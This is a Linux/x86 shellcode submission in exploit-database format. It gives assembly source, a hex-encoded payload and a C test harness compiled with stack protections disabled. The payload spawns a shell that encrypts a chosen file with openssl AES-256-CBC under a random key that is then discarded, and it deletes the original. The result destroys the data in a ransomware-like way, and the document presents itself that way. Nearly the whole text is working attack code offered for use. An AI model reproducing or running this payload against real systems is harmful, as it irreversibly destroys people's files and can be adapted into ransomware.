# Exploit Title: Linux/x86 openssl aes256cbc encrypt files small like ransomware (185 bytes)
# Google Dork: None
# Date: 02.05.2019
# Exploit Author: strider
# Vendor Homepage: None
# Software Link: None
# Tested on: Debian 9 Stretch i386/ Kali Linux i386
# CVE : None
# Shellcode Length: 185
------------------------------[Description]---------------------------------

This shellcode encrypts the specified file aith aes256cbc and a 32byte random key.
After encryption the key is dropped.

replace test.txt and .test.txt with any file.

-----------------------------[Shellcode Dump]---------------------------------
section .text

global _start

_start:
  xor eax, eax
  push eax
  jmp short _cmd

_exec:
  pop ecx
  mov edi, ecx
  xor ecx, ecx
  push eax
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp
  push eax
  push word 0x632d
  mov esi, esp
  push eax
  push edi
  push esi
  push ebx
  mov ecx, esp
  mov al, 11
  int 0x80

_cmd:
  call _exec
  ;replace test.txt with any file
  msg db "mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt", 0x0a


 -----------------------------[Compile]---------------------------------------------
 gcc -m32 -fno-stack-protector -z execstack -o tester tester.c

 -----------------------------[C-Code]-----------------------------

 #include <stdio.h>
 #include <string.h>

 unsigned char shellcode[] = "\x31\xc0\x50\xeb\x23\x59\x89\xcf\x31\xc9\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x66\x68\x2d\x63\x89\xe6\x50\x57\x56\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xd8\xff\xff\xff\x6d\x76\x20\x74\x65\x73\x74\x2e\x74\x78\x74\x20\x2e\x74\x65\x73\x74\x2e\x74\x78\x74\x20\x26\x26\x20\x68\x65\x61\x64\x20\x2d\x63\x20\x33\x32\x20\x2f\x64\x65\x76\x2f\x75\x72\x61\x6e\x64\x6f\x6d\x20\x7c\x20\x62\x61\x73\x65\x36\x34\x20\x7c\x20\x6f\x70\x65\x6e\x73\x73\x6c\x20\x61\x65\x73\x2d\x32\x35\x36\x2d\x63\x62\x63\x20\x2d\x65\x20\x2d\x69\x6e\x20\x2e\x74\x65\x73\x74\x2e\x74\x78\x74\x20\x2d\x6f\x75\x74\x20\x74\x65\x73\x74\x2e\x74\x78\x74\x20\x2d\x70\x62\x6b\x64\x66\x32\x20\x2d\x6b\x20\x2d\x20\x26\x26\x20\x72\x6d\x20\x2e\x74\x65\x73\x74\x2e\x74\x78\x74\x0a";
 void main()
 {
     printf("Shellcode Length:  %d\n", strlen(shellcode));

     int (*ret)() = (int(*)())shellcode;
     ret();
 }